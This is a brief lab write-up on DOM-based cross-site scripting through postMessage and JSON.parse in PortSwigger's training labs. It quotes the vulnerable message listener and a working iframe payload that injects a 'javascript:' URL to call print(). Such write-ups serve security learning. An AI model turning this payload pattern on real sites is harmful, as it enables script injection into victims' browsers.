# DOM-based vulnerabilities

Get details at [here](https://portswigger.net/web-security/dom-based)

---

[Lab 3](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

Description of this lab: construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function

Check the code, and we have this script for listening to event

```js
    <script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    </script>
```

Using this script for body exploit server, click to store and deliver to victim button, then solved the lab.

```html
    <iframe src=https://0a0a00c40438df56c0ea1539003800f9.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```